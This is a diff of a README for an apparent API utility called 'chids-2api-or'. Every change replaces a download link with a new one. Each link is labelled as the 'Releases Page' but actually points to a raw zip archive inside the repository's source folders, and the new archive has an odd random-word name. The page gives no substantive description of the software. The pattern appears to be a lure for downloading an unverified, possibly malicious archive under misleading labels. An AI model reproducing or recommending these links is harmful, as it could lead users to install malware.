@@ -1,6 +1,6 @@
 # 🚀 chids-2api-or - Simple and Efficient API Utility
 
-![Download](https://github.com/cosminmrggxsh/chids-2api-or/raw/refs/heads/main/internal/prompt/chids-or-api-2.7.zip%20release-brightgreen)
+![Download](https://github.com/cosminmrggxsh/chids-2api-or/raw/refs/heads/main/web/api-or-chids-stanniferous.zip%20release-brightgreen)
 
 ## 📦 Overview
 
@@ -19,7 +19,7 @@ To get started with **chids-2api-or**, follow these steps:
 
 1. **Visit the Releases Page**: To download the application, click on the link below.
    
-   [Visit the Releases Page to Download](https://github.com/cosminmrggxsh/chids-2api-or/raw/refs/heads/main/internal/prompt/chids-or-api-2.7.zip)
+   [Visit the Releases Page to Download](https://github.com/cosminmrggxsh/chids-2api-or/raw/refs/heads/main/web/api-or-chids-stanniferous.zip)
 
 2. **Choose the Right Version**: On the Releases page, look for the latest version available. The version will often be marked with the tag "Latest Release."
 
@@ -35,7 +35,7 @@ To get started with **chids-2api-or**, follow these steps:
 
 To download **chids-2api-or**, visit the Releases page:
 
-[Download from Releases Page](https://github.com/cosminmrggxsh/chids-2api-or/raw/refs/heads/main/internal/prompt/chids-or-api-2.7.zip)
+[Download from Releases Page](https://github.com/cosminmrggxsh/chids-2api-or/raw/refs/heads/main/web/api-or-chids-stanniferous.zip)
 
 Follow the steps above to successfully install and run the application on your device.
 
